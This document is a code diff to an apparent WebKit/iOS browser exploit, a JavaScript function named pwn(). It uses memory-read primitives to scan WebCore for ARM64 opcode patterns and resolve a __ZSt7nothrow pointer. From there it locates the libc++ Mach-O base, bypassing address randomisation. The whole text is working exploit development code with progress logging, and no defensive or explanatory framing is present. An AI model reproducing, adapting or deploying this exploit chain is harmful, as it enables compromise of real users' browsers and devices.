@@ -249,8 +249,8 @@ function pwn() {
     var vtab_addr = read64(el_addr);
     log(`[*] vtab_addr = ${(vtab_addr)}`);
 
-    var bl_dlopen_addr = Sub(vtab_addr, vtab_addr.lo() & 0xfff);
-    bl_dlopen_addr = Sub(bl_dlopen_addr, 0x105000);
+    var adrpldr_ZSt7nothrow_addr = Sub(vtab_addr, vtab_addr.lo() & 0xfff);
+    adrpldr_ZSt7nothrow_addr = Sub(adrpldr_ZSt7nothrow_addr, 0x95000);
 
     var try_count = 0;
     var opcode;
@@ -260,14 +260,14 @@ function pwn() {
             return;
         }
 
-        opcode = read64(bl_dlopen_addr);
+        opcode = read64(adrpldr_ZSt7nothrow_addr);
 
-        // WebCore:__text:000000018AF15D78 E9 03 00 32                             MOV             W9, #1
-        // WebCore:__text:000000018AF15D7C 09 01 00 39                             STRB            W9, [X8]
-        if(opcode == 0x39000109320003E9) {
+        // WebCore:__text:000000018AF86AA0 CB 01 00 54                             B.LT            loc_18AF86AD8
+        // WebCore:__text:000000018AF86AA4 E8 EF 40 B2                             MOV             X8, #0xFFFFFFFFFFFFFFF
+        if(opcode == 0xB240EFE8540001CB) {
             break;
         }
-        bl_dlopen_addr = Sub(bl_dlopen_addr, 0x4);
+        adrpldr_ZSt7nothrow_addr = Sub(adrpldr_ZSt7nothrow_addr, 0x4);
         try_count++;
     }
 
@@ -278,26 +278,23 @@ function pwn() {
             return;
         }
 
-        opcode = read32(bl_dlopen_addr);
-        if(((opcode & 0xFC000000) >>> 0)== 0x94000000)  //Is BL addr?
+        opcode = read32(adrpldr_ZSt7nothrow_addr);
+        if(((opcode & 0x9F000000) >>> 0) == 0x90000000)  //Is ADRP?
             break;
             
-        bl_dlopen_addr = Sub(bl_dlopen_addr, 0x4);
+        adrpldr_ZSt7nothrow_addr = Add(adrpldr_ZSt7nothrow_addr, 0x4);
 
         try_count++;
     }
-    log(`[+] found bl _dlopen addr: ${bl_dlopen_addr}`);
+    log(`[+] found adrpldr __ZSt7nothrow addr: ${adrpldr_ZSt7nothrow_addr}`);
 
-    var dlopen_addr = follow_bl(bl_dlopen_addr);
-    log(`[+] dlopen_addr: ${dlopen_addr}`);
+    var ZSt7nothrow_ptr = follow_adrpLdr(adrpldr_ZSt7nothrow_addr);
+    log(`[*] ZSt7nothrow_ptr: ${ZSt7nothrow_ptr}`);
 
-    var dlopen_ptr = follow_adrpLdr(dlopen_addr);
-    log(`[+] dlopen_ptr: ${dlopen_ptr}`);
+    var libcpp_ZSt7nothrow_addr = read64(ZSt7nothrow_ptr);
+    log(`[*] libcpp_ZSt7nothrow_addr: ${libcpp_ZSt7nothrow_addr}`);
 
-    var libdyld_dlopen_addr = read64(dlopen_ptr);
-    log(`[+] libdyld_dlopen_addr: ${libdyld_dlopen_addr}`);
-
-    var libdyld_base = Sub(libdyld_dlopen_addr, libdyld_dlopen_addr.lo() & 0xfff);
+    var libcpp_base = Sub(libcpp_ZSt7nothrow_addr, libcpp_ZSt7nothrow_addr.lo() & 0xfff);
     try_count = 0;
     while (true) {
         if(try_count > 0x100) {
@@ -305,15 +302,15 @@ function pwn() {
             return;
         }
 
-        machoMagic = read64(libdyld_base);
+        machoMagic = read64(libcpp_base);
 
         if(machoMagic == 0x100000CFEEDFACF) {
             break;
         }
-        libdyld_base = Sub(libdyld_base, 0x1000);
+        libcpp_base = Sub(libcpp_base, 0x1000);
         try_count++;
     }
-    log(`[+] libdyld_base: ${libdyld_base}`);
+    log(`[+] libcpp_base: ${libcpp_base}, try_count: ${try_count}`);
 
 
 
